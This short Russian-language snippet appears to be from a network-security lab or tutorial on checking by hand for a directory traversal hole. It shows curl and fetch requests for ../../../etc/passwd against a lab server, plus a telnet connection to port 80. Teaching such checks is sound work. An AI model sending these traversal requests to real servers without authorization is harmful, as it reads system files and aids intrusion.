
Определяем “вручную” нет ли уязвимости directory traversal

```
gate.isp.un$ curl --path-as-is http://server.corpX.un/../../../etc/passwd

gate.isp.un$ fetch -o - http://server.corpX.un/../../../etc/passwd

gate.isp.un$ telnet server.corpX.un 80
```
